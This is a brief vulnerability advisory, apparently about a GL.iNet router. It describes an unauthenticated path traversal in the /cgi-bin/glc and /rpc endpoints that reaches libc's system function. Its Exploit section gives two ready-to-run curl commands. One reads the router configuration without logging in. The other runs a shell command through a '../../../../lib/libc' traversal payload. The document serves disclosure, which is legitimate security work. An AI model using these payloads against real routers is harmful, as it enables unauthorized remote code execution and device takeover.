# Access to the C library without logging in
## Description
This vulnerability allows direct access via HTTP to /cgi-bin/glc to execute arbitrary methods within the C library, and the "glc" binary fails to properly sanitize the JSON data it receives, allowing the sending of path traversal sequences such as "../" within the "object" parameter. This can lead to potential arbitrary code execution.
## Affected Product

## Exploit
```
curl -v http://192.168.8.1/cgi-bin/glc --data-raw '{"object":"cable","method":"get_config"}'

curl -H 'glinet: 1' 127.0.0.1/rpc -d '{"method":"call", "params":["", "../../../../lib/libc", "system",{"command":"id"}]}' --If the path exists, it returns error code 0; if not, it returns "No such file or directory".
```
## Impact
An attacker can execute malicious code to manipulate the router by leveraging the execution of code within the C library combined with directory traversal.
